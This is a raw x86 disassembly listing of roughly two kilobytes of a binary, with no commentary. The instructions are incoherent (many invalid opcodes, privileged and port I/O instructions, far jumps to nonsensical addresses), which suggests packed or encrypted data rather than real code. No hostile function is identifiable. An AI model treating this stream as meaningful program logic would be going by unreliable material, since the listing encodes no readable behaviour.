  421058:	jbe    0x421017
  42105a:	retf   
  42105b:	add    DWORD PTR [esi],0xfffffff7
  42105e:	lods   eax,DWORD PTR ds:[esi]
  42105f:	(bad)  
  421060:	mov    WORD PTR [ebx-0x5],?
  421063:	hlt    
  421064:	sub    cl,0x59
  421067:	xor    BYTE PTR [edx+0x13c130a0],cl
  42106d:	popa   
  42106e:	loopne 0x421038
  421070:	mov    eax,0x1cb0a723
  421075:	adc    eax,0x89af44da
  42107a:	repnz imul ecx,ecx,0xffffffc0
  42107e:	xchg   ebp,eax
  42107f:	mul    DWORD PTR [eax]
  421081:	sub    eax,0xd48d7e75
  421086:	ror    BYTE PTR [edi-0x5f],cl
  421089:	pushf  
  42108a:	cmp    al,0x5d
  42108c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42108d:	shr    BYTE PTR [edx+0x3b],0x7f
  421091:	mov    al,ds:0xcdb44a9a
  421096:	or     al,dh
  421098:	retf   0x8c3
  42109b:	ja     0x4210ae
  42109d:	data16 add BYTE PTR [ecx-0x7dd95607],al
  4210a4:	cs dec ebp
  4210a6:	lea    ecx,[ecx-0x5e]
  4210a9:	or     DWORD PTR [esi],ecx
  4210ab:	and    BYTE PTR [eax],ch
  4210ad:	dec    esp
  4210ae:	aas    
  4210af:	jo     0x4210fa
  4210b1:	dec    ch
  4210b3:	je     0x4210da
  4210b5:	int3   
  4210b6:	or     al,0x81
  4210b8:	ds push cs
  4210ba:	fstp   QWORD PTR [ebx-0x1042d931]
  4210c0:	imul   ebp,DWORD PTR [edi+0x1e],0x2e
  4210c4:	fstp   TBYTE PTR [ebp-0x22e16711]
  4210ca:	inc    edx
  4210cb:	ror    BYTE PTR [edi+ebp*8+0x5eddfb05],cl
  4210d2:	rcl    BYTE PTR [eax-0x3f61f4e6],cl
  4210d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210d9:	mov    eax,ds:0xb273af99
  4210de:	xor    BYTE PTR [ecx+edi*4-0x69e6dc8f],0xfc
  4210e6:	xor    DWORD PTR [esi],ecx
  4210e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210e9:	test   al,0xf6
  4210eb:	(bad)  
  4210ec:	mov    ds:0x6bb677a0,eax
  4210f1:	(bad)  
  4210f2:	scas   eax,DWORD PTR es:[edi]
  4210f3:	inc    ecx
  4210f4:	mov    bh,0x1d
  4210f6:	jmp    0xec802eeb
  4210fb:	xor    BYTE PTR [edi-0x2e],al
  4210fe:	lahf   
  4210ff:	and    eax,edx
  421101:	jecxz  0x421107
  421103:	js     0x4210ce
  421105:	add    ah,BYTE PTR [ebx]
  421107:	adc    eax,0x21577169
  42110c:	xchg   DWORD PTR [ebx-0x22],edi
  42110f:	lods   al,BYTE PTR ds:[esi]
  421110:	xor    ebx,DWORD PTR [edi-0x56]
  421113:	lahf   
  421114:	or     DWORD PTR [esp+edi*4],ebx
  421117:	xchg   esi,eax
  421118:	push   edx
  421119:	sub    eax,0xcf77f5ad
  42111e:	mov    ebx,0x4f07d1a6
  421123:	xchg   BYTE PTR [di+0x28],dl
  421127:	inc    edx
  421128:	sti    
  421129:	stos   DWORD PTR es:[edi],eax
  42112a:	cmp    dh,cl
  42112c:	das    
  42112d:	push   cs
  42112e:	sbb    esi,ecx
  421130:	jne    0x4211b1
  421132:	inc    esp
  421133:	mov    al,ds:0xc4ce199a
  421138:	pusha  
  421139:	nop
  42113a:	int    0x44
  42113c:	rol    DWORD PTR [ebx],1
  42113e:	mov    DWORD PTR [esi+0x3308a843],esi
  421144:	pop    eax
  421145:	repz stc 
  421147:	iret   
  421148:	std    
  421149:	test   DWORD PTR ds:0xe15466ff,ebx
  42114f:	iret   
  421150:	pop    ds
  421151:	xchg   edx,eax
  421152:	jmp    0x42119a
  421154:	dec    edi
  421155:	call   0x7751a3
  42115a:	lods   eax,DWORD PTR ds:[esi]
  42115b:	or     eax,0xe68c4f21
  421160:	mov    BYTE PTR [edi+ebx*4],ah
  421163:	xor    BYTE PTR [eax-0x4b283f38],0x37
  42116a:	mov    eax,0xff6d2771
  42116f:	sbb    edx,esp
  421171:	adc    dl,BYTE PTR [ecx+eax*2-0x7d1ae48d]
  421178:	mov    ebx,0x35340a9f
  42117d:	ja     0x42114d
  42117f:	cmp    al,0xf
  421181:	pop    ebp
  421182:	xchg   edx,eax
  421183:	or     BYTE PTR fs:[eax+esi*4],dh
  421187:	pop    esp
  421188:	inc    esp
  421189:	xor    dh,BYTE PTR ds:0x9acc81dc
  42118f:	ss dec ebp
  421191:	test   eax,edi
  421193:	jp     0x4211c2
  421195:	jmp    0x4211a7
  421197:	std    
  421198:	and    ebp,DWORD PTR [ecx-0x1]
  42119b:	jl     0x4211f7
  42119d:	add    BYTE PTR [ecx-0x60],bh
  4211a0:	or     DWORD PTR [eax],edi
  4211a2:	push   edx
  4211a3:	pop    edi
  4211a4:	push   ebp
  4211a5:	icebp  
  4211a6:	icebp  
  4211a7:	punpckldq mm3,DWORD PTR [ebx+eax*8+0x6ec6b270]
  4211af:	mov    BYTE PTR [ebp+0x2951001c],ch
  4211b5:	mov    cl,ah
  4211b7:	aaa    
  4211b8:	jl     0x421204
  4211ba:	stos   DWORD PTR es:[edi],eax
  4211bb:	mov    esi,0xb90d9af0
  4211c0:	fstp   st(6)
  4211c2:	hlt    
  4211c3:	push   cs
  4211c4:	or     BYTE PTR [edx-0x3100d9fb],al
  4211ca:	sub    DWORD PTR [edx+ebp*2-0x4a],ecx
  4211ce:	pop    ds
  4211cf:	and    BYTE PTR [edi-0x50],0xe5
  4211d3:	push   es
  4211d4:	imul   eax,esi,0xffffffd4
  4211d7:	clc    
  4211d8:	mov    edi,0x4faa67a8
  4211dd:	aaa    
  4211de:	clc    
  4211df:	hlt    
  4211e0:	fadd   QWORD PTR [edi+0x4e]
  4211e3:	xlat   BYTE PTR ds:[ebx]
  4211e4:	mov    cl,0x5b
  4211e6:	jg     0x421192
  4211e8:	sahf   
  4211e9:	cmp    DWORD PTR [ecx-0x54],ecx
  4211ec:	imul   edx,ebp,0x2c
  4211ef:	cwde   
  4211f0:	lock push 0x93174926
  4211f6:	pop    es
  4211f7:	test   BYTE PTR [eax-0x27cac98],bh
  4211fd:	(bad)  
  4211fe:	bound  eax,QWORD PTR [edx+eax*2-0x4c]
  421202:	jle    0x4211b1
  421204:	in     al,dx
  421205:	(bad)  
  421206:	jb     0x4211da
  421208:	stos   BYTE PTR es:[edi],al
  421209:	and    eax,0x3ab92ed2
  42120e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42120f:	into   
  421210:	fcomp  st(1)
  421212:	and    BYTE PTR [edi-0xf],0x36
  421216:	icebp  
  421217:	mov    ecx,0x5f8bab20
  42121c:	sbb    BYTE PTR [ebx-0x15],al
  42121f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421220:	arpl   WORD PTR [ebp+0x5b3cd09e],bp
  421226:	outs   dx,BYTE PTR ds:[esi]
  421227:	inc    edx
  421228:	jb     0x421277
  42122a:	jmp    0x54ff0b68
  42122f:	mov    cl,0x46
  421231:	and    ebx,DWORD PTR [esi-0x91390bb]
  421237:	sti    
  421238:	call   0xdc18:0x3924dbd6
  42123f:	pushf  
  421240:	xor    BYTE PTR [esp+edx*8+0x6ec05286],dl
  421247:	jo     0x42121e
  421249:	mov    esi,0xbd2355a0
  42124e:	mov    ecx,0xf13621b2
  421253:	jns    0x421276
  421255:	sbb    DWORD PTR [ebp-0x67],esi
  421258:	mov    edi,0x47bce9d2
  42125d:	in     eax,0xa9
  42125f:	es aam 0x5c
  421262:	mov    bh,0x48
  421264:	and    edi,esp
  421266:	mov    ds:0xefac7520,eax
  42126b:	xchg   ecx,ebp
  42126d:	cmp    DWORD PTR es:[esi+eiz*2+0x672c6eb4],0x88b92d44
  421279:	outs   dx,BYTE PTR ds:[esi]
  42127a:	pop    ebp
  42127b:	repz jno 0x42127a
  42127e:	imul   esi,ebp,0x3c622faa
  421284:	dec    edi
  421285:	inc    esi
  421286:	sbb    al,0x35
  421288:	or     DWORD PTR [edx+0x38746216],edi
  42128e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42128f:	or     dl,BYTE PTR [esi]
  421291:	xor    al,0x38
  421293:	fdiv   st,st(6)
  421295:	adc    dh,dl
  421297:	xor    DWORD PTR [eax],0x44
  42129a:	sub    ebx,eax
  42129c:	push   ss
  42129d:	scas   eax,DWORD PTR es:[edi]
  42129e:	pop    ebx
  42129f:	out    dx,al
  4212a0:	sbb    BYTE PTR [esp+ebp*4-0x4a],dh
  4212a4:	stos   DWORD PTR es:[edi],eax
  4212a5:	add    ecx,ebx
  4212a7:	pop    esi
  4212a8:	adc    eax,DWORD PTR [edi-0x37a6a084]
  4212ae:	pop    edx
  4212af:	ins    DWORD PTR es:[edi],dx
  4212b0:	cdq    
  4212b1:	fiadd  DWORD PTR [edx+0x2c0d512b]
  4212b7:	jno    0x42132c
  4212b9:	outs   dx,BYTE PTR ds:[esi]
  4212ba:	push   esp
  4212bb:	jnp    0x421315
  4212bd:	xchg   edi,eax
  4212be:	pop    es
  4212bf:	mov    bl,BYTE PTR [ecx+eax*4+0x7ffbedef]
  4212c6:	pop    DWORD PTR [eax-0x2b]
  4212c9:	pop    esp
  4212ca:	test   al,0x36
  4212cc:	retf   
  4212cd:	jae    0x42132a
  4212cf:	cdq    
  4212d0:	stos   BYTE PTR es:[edi],al
  4212d1:	mov    bh,0x54
  4212d3:	hlt    
  4212d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212d5:	inc    esp
  4212d6:	test   eax,0xa047e799
  4212db:	push   ds
  4212dc:	repnz pop esp
  4212de:	leave  
  4212df:	fld    QWORD PTR [ecx]
  4212e1:	or     edi,DWORD PTR [ebx+0x31145eed]
  4212e7:	mov    ds:0x26b03d9c,eax
  4212ec:	and    dh,BYTE PTR [ebx+0x59a216c8]
  4212f2:	jae    0x421330
  4212f4:	test   eax,0x14a8ed3c
  4212f9:	das    
  4212fa:	nop
  4212fb:	xchg   ecx,eax
  4212fc:	mov    BYTE PTR [ecx+ecx*1+0x5d],dh
  421300:	push   cs
  421301:	mov    esi,0xb1f646d1
  421306:	mov    edx,0x647454e5
  42130b:	adc    DWORD PTR [esi],0xffffffad
  42130e:	shl    BYTE PTR [esi+0x5972555e],0xb3
  421315:	mov    ecx,0xf795f4e5
  42131a:	mov    al,0x1f
  42131c:	lock sbb al,0x11
  42131f:	inc    eax
  421320:	cmp    cl,BYTE PTR [esi+0x7b385115]
  421326:	cli    
  421327:	call   0x86a2:0xaa594cec
  42132e:	dec    esi
  42132f:	mov    ebx,DWORD PTR [edx+0x42]
  421332:	(bad)  
  421333:	cdq    
  421334:	rcr    BYTE PTR [ebx],cl
  421336:	jg     0x4213a8
  421338:	or     eax,0x670514d9
  42133d:	and    BYTE PTR [edi],ch
  42133f:	mov    dh,0xcf
  421341:	fdivr  QWORD PTR [edx-0x11c6543e]
  421347:	jns    0x4212ce
  421349:	xor    bl,BYTE PTR [eax]
  42134b:	mov    edx,0x693f035a
  421350:	cmc    
  421351:	clc    
  421352:	out    dx,al
  421353:	aas    
  421354:	or     edx,ebp
  421356:	clc    
  421357:	jle    0x42138d
  421359:	or     ch,ch
  42135b:	sub    ebp,ebx
  42135d:	mov    al,0x53
  42135f:	jecxz  0x421367
  421361:	inc    esp
  421362:	hlt    
  421363:	dec    ebx
  421364:	dec    edx
  421365:	mov    WORD PTR [edx+0x13f5ac67],es
  42136b:	(bad)  
  42136c:	mov    ebp,0x17441f56
  421371:	or     eax,0x32ac4e75
  421376:	repnz retf 
  421378:	cmc    
  421379:	sbb    BYTE PTR [esi-0x65],ch
  42137c:	mov    eax,0xab866c5c
  421381:	loope  0x421374
  421383:	xor    esi,ebp
  421385:	cwde   
  421386:	mov    esi,0x2f27b042
  42138b:	mov    eax,ds:0xe620f24
  421390:	jno    0x421371
  421392:	xchg   esi,eax
  421393:	dec    ecx
  421394:	sub    ah,dl
  421396:	iret   
  421397:	cs dec edi
  421399:	push   ebp
  42139a:	fdivr  QWORD PTR [edi-0x5e]
  42139d:	dec    eax
  42139e:	aas    
  42139f:	ds push es
  4213a1:	or     eax,0x6b097fcd
  4213a6:	xlat   BYTE PTR ds:[ebx]
  4213a7:	cmp    DWORD PTR [ebx-0x54],0x913dfc61
  4213ae:	jo     0x4213e6
  4213b0:	sub    DWORD PTR [edi+edx*1-0x229ea50b],ecx
  4213b7:	rol    BYTE PTR [edx-0x661f77f9],1
  4213bd:	add    WORD PTR [ebp+0x43],0xb52f
  4213c3:	ror    BYTE PTR [edi-0xf],1
  4213c6:	and    ebx,esp
  4213c8:	(bad)  
  4213ca:	inc    esp
  4213cb:	out    dx,eax
  4213cc:	je     0x4213ec
  4213ce:	sbb    dl,BYTE PTR [edi]
  4213d0:	sub    DWORD PTR [ebx],edi
  4213d2:	cmp    ecx,0xffffff9c
  4213d5:	or     al,0x73
  4213d7:	mov    dh,ah
  4213d9:	ja     0x421449
  4213db:	xchg   ah,al
  4213dd:	aaa    
  4213de:	mov    bh,0x5e
  4213e0:	jmp    0xeb132d34
  4213e5:	add    ch,bl
  4213e7:	cmc    
  4213e8:	mov    ds:0x1c7baebe,eax
  4213ed:	inc    ecx
  4213ee:	popf   
  4213ef:	adc    al,0xfd
  4213f1:	pop    ebx
  4213f2:	pop    esp
  4213f3:	mov    BYTE PTR [esi+eax*4-0x54],dl
  4213f7:	out    0x91,al
  4213f9:	jne    0x421408
  4213fb:	sahf   
  4213fc:	or     bh,ch
  4213fe:	retf   0xf2ea
  421401:	shl    BYTE PTR [eax+edx*2+0x3fbecbc4],0x10
  421409:	inc    esi
  42140a:	mov    cs,WORD PTR [ebp-0x52abaee2]
  421410:	or     DWORD PTR [edi+ecx*8-0x1bddda97],eax
  421417:	stc    
  421418:	not    DWORD PTR [esi]
  42141a:	sub    eax,0x77e16187
  42141f:	aam    0x1e
  421421:	jno    0x4213d4
  421423:	es dec ebx
  421425:	jb     0x42146e
  421427:	dec    ecx
  421428:	add    DWORD PTR [esi-0x263a2fa0],edi
  42142e:	push   ss
  42142f:	or     ebp,esp
  421431:	push   0x90803d45
  421436:	dec    eax
  421437:	arpl   WORD PTR [ebx],bx
  421439:	stos   BYTE PTR es:[edi],al
  42143a:	imul   DWORD PTR ds:0xbf35280
  421440:	push   ebx
  421441:	data16 into 
  421443:	push   cs
  421444:	or     al,0x9e
  421446:	mov    ebp,0x6ffedcee
  42144b:	pop    ebx
  42144c:	add    al,BYTE PTR [ebp+0x3753db45]
  421452:	adc    eax,0x67133410
  421457:	add    esp,DWORD PTR [ebp-0x210bb46]
  42145d:	jns    0x4213fe
  42145f:	pop    edi
  421460:	dec    eax
  421461:	test   eax,0x118fa41e
  421466:	fld    TBYTE PTR [edi-0x4e69da48]
  42146c:	pushf  
  42146d:	into   
  42146e:	mov    ah,0x47
  421470:	dec    ecx
  421471:	adc    DWORD PTR [eax-0x77],0xeadedf17
  421478:	dec    esp
  421479:	and    eax,0x88392523
  42147e:	pushf  
  42147f:	xchg   ecx,eax
  421480:	push   cs
  421481:	mov    ebx,0x4b63628
  421486:	pop    edi
  421487:	jle    0x4214b6
  421489:	test   al,0x56
  42148b:	mov    cs,WORD PTR [edi+0x1fd09772]
  421491:	adc    al,0xf7
  421493:	xor    eax,0xaf8e8a24
  421498:	or     edi,DWORD PTR [ebx]
  42149a:	nop
  42149b:	sbb    eax,0x99519470
  4214a0:	jo     0x4214f6
  4214a2:	mov    ebx,0xc4d7f624
  4214a7:	jnp    0x421479
  4214a9:	psllq  mm0,mm1
  4214ac:	xchg   esi,eax
  4214ad:	mov    dh,0x85
  4214af:	or     al,al
  4214b1:	call   0x5e83:0xd6298c59
  4214b8:	xor    BYTE PTR [ebx],bh
  4214ba:	cli    
  4214bb:	out    0x37,eax
  4214bd:	jnp    0x42149c
  4214bf:	sub    DWORD PTR [ebx+0x60],ecx
  4214c2:	mov    DWORD PTR [edi+0x3859249b],ecx
  4214c8:	xor    eax,0xecd58654
  4214cd:	imul   esi,DWORD PTR [ebx],0x1a1384b
  4214d3:	jmp    0xc856e23e
  4214d8:	ret    0xf5d1
  4214db:	in     al,dx
  4214dc:	mov    al,0x61
  4214de:	push   es
  4214df:	mov    esi,0x5346021b
  4214e4:	loop   0x421521
  4214e6:	cwde   
  4214e7:	pop    ds
  4214e8:	out    0xa6,al
  4214ea:	xchg   edx,eax
  4214eb:	sbb    BYTE PTR [esi+0x53],ah
  4214ee:	mov    esi,0xd6e8082f
  4214f3:	xchg   ebx,eax
  4214f4:	loop   0x4214c3
  4214f6:	mov    gs,ecx
  4214f8:	loope  0x42156f
  4214fa:	mov    ecx,0xb0d72b15
  4214ff:	push   ecx
  421500:	js     0x421522
  421502:	pop    ecx
  421503:	push   edi
  421504:	and    DWORD PTR [esi-0x67],edx
  421507:	and    ch,BYTE PTR ds:0x456b11c9
  42150d:	int    0x32
  42150f:	jns    0x42154a
  421511:	mov    bh,0x6a
  421513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421515:	push   esi
  421516:	(bad)  
  421517:	in     al,dx
  421518:	and    DWORD PTR [eax],0xffffff82
  42151b:	dec    esp
  42151c:	sbb    edi,DWORD PTR [edi]
  42151e:	mov    ch,0x1d
  421520:	xchg   esi,eax
  421521:	iret   
  421522:	xor    al,0x87
  421524:	xor    BYTE PTR [edi-0x3d],ch
  421527:	or     eax,0x54cfd992
  42152c:	test   ebx,ebp
  42152e:	push   cs
  42152f:	imul   edx
  421531:	jle    0x4214c4
  421533:	or     al,0x24
  421535:	dec    ebx
  421536:	enter  0x9c2d,0x5d
  42153a:	cwde   
  42153b:	dec    esp
  42153c:	dec    eax
  42153d:	pop    edi
  42153e:	out    dx,al
  42153f:	jecxz  0x421543
  421541:	cmp    BYTE PTR [eax+0xa],dh
  421544:	mov    ebp,0x26a3c0f1
  421549:	icebp  
  42154a:	inc    ebx
  42154b:	sub    BYTE PTR cs:[esi-0xe],ch
  42154f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421550:	pop    ds
  421551:	retf   
  421552:	xchg   ebp,eax
  421553:	sbb    cl,BYTE PTR [eax]
  421555:	and    eax,0x626988ad
  42155a:	pop    ds
  42155b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42155c:	fisub  WORD PTR ss:[edx+0x3d]
  421560:	mov    es,WORD PTR [ebx+0x48]
  421563:	hlt    
  421564:	adc    DWORD PTR [ebx-0x8ef2ce3],ebx
  42156a:	arpl   WORD PTR [ecx-0x3e],di
  42156d:	adc    al,cl
  42156f:	daa    
  421570:	sub    esi,DWORD PTR [edi+0x5e]
  421573:	fmul   DWORD PTR [ecx]
  421575:	iret   
  421576:	jne    0x421545
  421578:	repz or edx,eax
  42157b:	dec    eax
  42157c:	(bad)  
  42157d:	sahf   
  42157e:	cwde   
  42157f:	in     al,0x4a
  421581:	dec    DWORD PTR [eax-0x2d]
  421584:	pop    ecx
  421585:	imul   eax,DWORD PTR [edi+0x2ef08cb8],0x1e
  42158c:	out    dx,al
  42158d:	clc    
  42158e:	fwait
  42158f:	imul   ebx,DWORD PTR [edi+0xbacde27],0xffffff89
  421596:	outs   dx,BYTE PTR ds:[esi]
  421597:	dec    eax
  421598:	xor    bh,BYTE PTR [eax]
  42159a:	cmc    
  42159b:	xchg   edi,eax
  42159c:	scas   eax,DWORD PTR es:[edi]
  42159d:	xchg   dl,ah
  42159f:	pop    ecx
  4215a0:	cmp    eax,0x2f24ebc3
  4215a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215a6:	pop    eax
  4215a7:	(bad)  
  4215a8:	cli    
  4215a9:	jns    0x421550
  4215ab:	lock out 0x3e,eax
  4215ae:	sub    ebx,ecx
  4215b0:	test   DWORD PTR [eax+0x4f80cf22],edx
  4215b6:	dec    esi
  4215b7:	outs   dx,BYTE PTR ds:[esi]
  4215b8:	repz mov cl,0xb7
  4215bb:	test   BYTE PTR [ebp+0x5c],ch
  4215be:	mov    eax,ecx
  4215c0:	sbb    edx,DWORD PTR [edi+edi*2]
  4215c3:	push   edi
  4215c4:	dec    edi
  4215c5:	add    BYTE PTR [ebx],dl
  4215c7:	aam    0xe9
  4215c9:	xor    DWORD PTR [esi-0x29687deb],0x1ec94a67
  4215d3:	xlat   BYTE PTR ds:[ebx]
  4215d4:	mov    ds:0xf7043ac4,eax
  4215d9:	outs   dx,DWORD PTR ds:[esi]
  4215da:	js     0x42161f
  4215dc:	and    DWORD PTR [edx+eiz*1-0x76c80bcd],ebp
  4215e3:	add    eax,0x173672de
  4215e8:	stos   BYTE PTR es:[edi],al
  4215e9:	cli    
  4215ea:	xor    eax,DWORD PTR [esp-0x71]
  4215ee:	or     al,0xb8
  4215f0:	arpl   WORD PTR [esi+eax*8-0x371197],dx
  4215f7:	mov    DWORD PTR [edx-0x604e4e6b],ecx
  4215fd:	mov    ebp,0x787656b0
  421602:	cs jl  0x4215e3
  421605:	fwait
  421606:	jmp    0x421622
  421608:	stos   DWORD PTR es:[edi],eax
  421609:	aas    
  42160a:	cmovno edx,DWORD PTR [ecx+0x5d]
  42160e:	lock ja 0x421649
  421611:	(bad)  [edi]
  421613:	xchg   ebp,eax
  421614:	enter  0x73,0xc2
  421618:	in     eax,0xee
  42161a:	xchg   al,bh
  42161c:	xchg   edx,eax
  42161d:	xchg   esi,eax
  42161e:	jg     0x4215b9
  421620:	fmul   st(3),st
  421622:	stc    
  421623:	pop    esi
  421624:	leave  
  421625:	out    0x7a,al
  421627:	xchg   BYTE PTR [edi+0x2f9aa2c],ah
  42162d:	mov    bl,0x26
  42162f:	(bad)  
  421630:	dec    edi
  421631:	das    
  421632:	jnp    0x421660
  421634:	push   ds
  421635:	or     al,0x7e
  421637:	stos   DWORD PTR es:[edi],eax
  421638:	sbb    dl,BYTE PTR [ebp+0xdcaac51]
  42163e:	add    BYTE PTR [eax],al
  421640:	les    ebp,FWORD PTR [edx-0x80]
  421643:	xor    DWORD PTR ds:0x4b27a349,0x21
  42164a:	fstp   TBYTE PTR [edi+0x19]
  42164d:	jo     0x4216a6
  42164f:	ret    
  421650:	mov    ds:0xeeefcf18,eax
  421655:	push   ebp
  421656:	adc    ah,dl
  421658:	mov    esi,0x93075517
  42165d:	fild   QWORD PTR [ecx+ebp*4]
  421660:	fucomi st,st(1)
  421662:	sbb    ecx,ecx
  421664:	sub    ebp,esp
  421666:	cs cwde 
  421668:	xchg   DWORD PTR [edi+eax*1-0x56],ecx
  42166c:	stos   BYTE PTR es:[edi],al
  42166d:	dec    ebx
  42166e:	xor    cl,BYTE PTR [ebx]
  421670:	into   
  421671:	sub    al,0x2c
  421673:	sbb    esp,DWORD PTR [ecx+ebx*4-0x14]
  421677:	pushf  
  421678:	pop    ss
  421679:	xor    eax,0xcb83fb8e
  42167e:	and    al,0x39
  421680:	out    dx,eax
  421681:	daa    
  421682:	pop    eax
  421683:	sti    
  421684:	data16 jl 0x42161c
  421687:	adc    al,0x9c
  421689:	sbb    DWORD PTR [ebx+0x1f],eax
  42168c:	ss jne 0x421626
  42168f:	sub    ecx,esp
  421691:	inc    eax
  421692:	mov    ecx,0xaea6e76b
  421697:	or     eax,0x83afe453
  42169c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42169d:	and    BYTE PTR [ecx+ebx*4+0x6b1f82a9],0x1e
  4216a5:	mov    DWORD PTR [esi],0xd04f1c90
  4216ab:	mov    dh,0x98
  4216ad:	and    al,dl
  4216af:	(bad)  
  4216b0:	mov    dl,0x4d
  4216b2:	dec    edi
  4216b3:	jmp    0x19af:0x2627c5d9
  4216ba:	inc    eax
  4216bb:	cwde   
  4216bc:	call   0x9f2210cf
  4216c1:	sbb    DWORD PTR [edx+0x7a],0x6fb91454
  4216c8:	outs   dx,BYTE PTR ds:[esi]
  4216c9:	call   0xe851:0xedb53645
  4216d0:	jo     0x42173e
  4216d2:	pop    ebx
  4216d3:	fwait
  4216d4:	leave  
  4216d5:	call   0xf08d:0xd1d4ecfc
  4216dc:	in     eax,0xa6
  4216de:	mov    WORD PTR [esi],?
  4216e0:	leave  
  4216e1:	icebp  
  4216e2:	push   ds
  4216e3:	lods   eax,DWORD PTR ds:[esi]
  4216e4:	sahf   
  4216e5:	xchg   BYTE PTR [ecx+0x73],cl
  4216e8:	call   0x224c:0x2f0a1dc7
  4216ef:	xor    BYTE PTR [edi],al
  4216f1:	mov    al,ds:0xa7e9d31a
  4216f6:	test   BYTE PTR [ebx-0x33],bl
  4216f9:	push   0x33
  4216fb:	loopne 0x4216b6
  4216fd:	pop    esi
  4216fe:	jmp    0x4216c0
  421700:	(bad)  
  421702:	sbb    ch,bh
  421704:	mov    bl,0xbb
  421706:	nop
  421707:	pop    ebx
  421708:	lahf   
  421709:	pop    edx
  42170a:	ret    
  42170b:	stos   BYTE PTR es:[edi],al
  42170c:	data16 add bl,dh
  42170f:	nop
  421710:	sbb    al,0xba
  421712:	mov    edx,DWORD PTR [eax+0x2f]
  421715:	pop    ds
  421716:	adc    BYTE PTR [eax],bl
  421718:	sbb    BYTE PTR [esp+edx*1-0x30ec4a31],cl
  42171f:	dec    edx
  421720:	and    esp,DWORD PTR [ebp-0x6ed35b87]
  421726:	pushf  
  421727:	mov    bl,0x5c
  421729:	inc    esi
  42172a:	xor    DWORD PTR [edi+0x40],ebp
  42172d:	sub    BYTE PTR [edx-0x11],cl
  421730:	xor    eax,0x1fbc8f83
  421735:	popa   
  421736:	popf   
  421737:	loopne 0x42171b
  421739:	jns    0x4217b5
  42173b:	pop    edx
  42173c:	sbb    DWORD PTR [ebp+ecx*2+0x20],0xf2fc8bf6
  421744:	and    bl,BYTE PTR [ebx+0x3df167]
  42174a:	call   DWORD PTR [esi+0x6f51e25]
  421750:	sar    edx,cl
  421752:	push   esp
  421753:	sub    ebx,DWORD PTR [eax+0x60]
  421756:	or     cl,BYTE PTR [eax+0x3d212b7a]
  42175c:	xchg   ecx,eax
  42175d:	in     eax,0x20
  42175f:	xor    cl,BYTE PTR [edx-0x5f]
  421762:	or     ch,dh
  421764:	cmc    
  421765:	add    al,0x92
  421767:	sub    BYTE PTR [edi+ecx*4],0xa1
  42176b:	in     al,0x22
  42176d:	leave  
  42176e:	jl     0x421740
  421770:	loope  0x421778
  421772:	pusha  
  421773:	sbb    ah,ch
  421775:	loop   0x421702
  421777:	push   edx
  421778:	xchg   esp,eax
  421779:	add    eax,0xf2c0f067
  42177e:	mov    ecx,0xfb6f4d58
  421783:	sub    eax,0x66c4acb4
  421788:	add    eax,0xaf183b2e
  42178d:	xchg   ebx,eax
  42178e:	and    al,0x42
  421790:	shr    DWORD PTR [esi+0x4b2a36ba],0xcd
  421797:	cwde   
  421798:	imul   ecx,DWORD PTR [ecx-0x730315f5],0x2d
  42179f:	in     al,0x11
  4217a1:	xor    al,0x74
  4217a3:	lock inc ecx
  4217a5:	cmp    eax,0xba810328
  4217aa:	ret    
  4217ab:	je     0x42174a
  4217ad:	(bad)  
  4217af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217b0:	add    al,0x7
  4217b2:	dec    ecx
  4217b3:	addr16 js 0x421777
  4217b6:	add    al,0x81
  4217b8:	jecxz  0x421799
  4217ba:	or     edx,edx
  4217bc:	rcr    BYTE PTR [esi],0x34
  4217bf:	pop    edi
  4217c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217c2:	fld    QWORD PTR [esi+0x36b5f965]
  4217c8:	btc    esi,ebx
  4217cb:	push   esi
  4217cc:	inc    edi
  4217cd:	mov    bl,0xa1
  4217cf:	pop    ebx
  4217d0:	sub    esp,edx
  4217d2:	and    al,0xee
  4217d4:	imul   DWORD PTR [ebx]
  4217d6:	in     eax,dx
  4217d7:	mov    cl,0x8c
  4217d9:	fisub  WORD PTR [eax]
  4217db:	push   ebx
  4217dc:	enter  0x431a,0xc9
  4217e0:	cli    
  4217e1:	repnz jecxz 0x421811
  4217e4:	dec    ebp
  4217e5:	fld    TBYTE PTR [edi]
  4217e7:	rcr    DWORD PTR [edi+eiz*2-0x55],1
  4217eb:	xor    DWORD PTR [edi-0x17],ebx
  4217ee:	(bad)  
  4217ef:	out    0xce,eax
  4217f1:	add    eax,0xede78b3b
  4217f6:	mov    esp,0x9aef8a21
  4217fb:	mov    eax,0x385c45d7
  421800:	push   0xffffffda
  421802:	stos   BYTE PTR es:[edi],al
  421803:	(bad)  
  421804:	jb     0x421803
  421806:	outs   dx,BYTE PTR ds:[esi]
  421807:	lds    edi,FWORD PTR [edx-0x519cab7a]
  42180d:	stc    
  42180e:	add    DWORD PTR [edi],eax
  421810:	jmp    0x1546:0x5a8b685c
  421817:	loope  0x421842
  421819:	xchg   ecx,eax
  42181a:	aaa    
  42181b:	push   eax
  42181c:	lds    ecx,FWORD PTR [eax+0x130a6b1]
  421822:	sbb    BYTE PTR [edi],bh
  421824:	je     0x42182a
  421826:	sbb    eax,0x21447563
  42182b:	jne    0x4217e0
  42182d:	mov    bl,0x2d
  42182f:	sar    DWORD PTR [ebp+0x12],0x21
  421833:	jmp    0xe851238f
  421838:	popf   
  421839:	cmc    
  42183a:	jnp    0x4218a9
  42183c:	sub    eax,0x36e1e212
  421841:	stos   DWORD PTR es:[edi],eax
  421842:	push   ds
  421843:	push   0x49
  421845:	add    DWORD PTR ds:[esi+eax*8],esp
  421849:	fmul   QWORD PTR [edx+0xd]
  42184c:	xchg   edi,eax
  42184d:	cmp    dl,bh
  42184f:	or     eax,0x9e50d7b5
  421854:	or     edi,ecx
